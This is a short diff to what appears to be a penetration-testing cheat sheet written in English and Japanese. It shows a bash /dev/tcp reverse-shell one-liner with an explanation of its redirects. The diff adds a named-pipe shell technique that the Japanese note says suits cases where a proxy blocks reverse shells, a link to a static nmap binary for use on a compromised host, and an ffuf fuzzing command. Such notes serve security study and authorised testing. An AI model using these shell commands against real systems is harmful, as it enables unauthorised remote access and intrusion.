@@ -122,6 +122,10 @@
     - bash -i >& /dev/tcp/127.0.0.1/4444  0>&1
       - redirect stdout, stderr, stdin to a socket
       - ">&" redirect stdout, stderr to a socket, "0>&1" redirect stdin to stdout(a socket).
+    - mkfifo /tmp/input; tail -f /tmp/input | bash 2>&1 > /tmp/output;
+      - プロキシなどが間に存在し、リバースシェルが利用できないシーンで活用可能
+    - [fstatic compile nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)
+      - 侵入したホストでnmapが必要になった時、使用する
   - fuzzing([ffuf](https://github.com/ffuf/ffuf))
   
     - ffuf -u http://example.com/test?param=FUZZ -w /opt/SecLists/Fuzzing/special-chars.txt -mc all
